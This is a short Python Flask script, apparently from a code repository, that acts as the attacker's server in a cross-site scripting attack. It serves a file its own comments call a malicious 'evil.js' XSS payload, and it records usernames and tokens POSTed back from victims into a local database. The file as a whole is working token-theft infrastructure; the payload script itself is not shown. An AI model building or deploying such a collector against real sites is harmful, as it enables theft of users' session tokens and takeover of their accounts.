from flask import Flask, send_file, make_response, request
from database import define_connection, insert_data

app = Flask(__name__)

database = r"user_store.db"

# Triggered by POST request, this will commit users and tokens to DB
@app.route('/tokens', methods=['POST'])
def tokensjs():
    f = request.form
    token = f['token']
    user = f['user']
    if user == 'undefined':
        print("User is undefined - Something MAY have failed.")
        print("Will not write to database if user is undefined.")
        return make_response(
        'Success',
        200
    )
    if user != 'undefined':
        print(user)
        conn = define_connection(database)
        insert_data(conn, user, token)
        return make_response(
            'Success',
            200
    )

# Triggered by a GET request - this will send malicious javascript file
@app.route('/evil.js', methods=(['GET']))
def eviljs():
    print("Sending XSS JS file")
    return send_file('./evil.js', download_name='evil.js')
    
app.run(host='127.0.0.1', port=8080)

Footer
